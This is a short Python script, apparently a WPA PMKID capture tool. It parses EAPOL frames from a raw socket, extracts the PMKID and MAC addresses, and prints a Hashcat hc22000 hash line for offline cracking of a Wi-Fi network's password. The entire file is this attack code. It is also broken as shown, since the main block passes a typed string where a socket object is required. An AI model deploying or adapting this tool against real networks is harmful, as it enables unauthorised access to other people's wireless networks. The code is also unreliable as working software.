import socket, sys


def detector(rawSocket, essid):
    frame_num = 0
    first_eapol_frame = None
    pmkid = None
    mac_ap = None
    mac_cl = None

    # Listen for packets from target network
    while True:
        packet = rawSocket.recvfrom(2048)[0]
        frame_body = packet

        # Offset may vary depending on equipment and AP. 2 worked when
        # testing with a TP-Link Archer C1200 v2.0 Router
        # Firmware Version 2.0.0, but your setup may require an offset
        # of 0, 4, 6 or something else.
        offset = 2
        eapol_frame = frame_body[offset:]
        frame_num += 1

        if frame_num == 1:
            first_eapol_frame = eapol_frame
            pmkid = eapol_frame[-16:].hex()
            mac_ap = eapol_frame[4:10].hex()

        if frame_num == 2:
            mac_cl = eapol_frame[4:10].hex()
            print("\n@>1st EAPoL Frame:   \n" + str(first_eapol_frame) + "\n")
            print("@>Possible PMKID:        ", pmkid)
            print("@>SSID:                  ", essid)
            print("@>MAC AP:                ", mac_ap)
            print("@>MAC Client:            ", mac_cl)
            print("\n@>Hashcat hc22000 format hash line:")
            print("WPA*01*" + pmkid + "*" + mac_ap + "*" + mac_cl + \
                  "*" + bytes(essid, 'utf-8').hex() + "***")


if __name__ == '__main__':
    sock = input("sock:")
    ssid = input("ssid:")
    detector(sock, ssid)
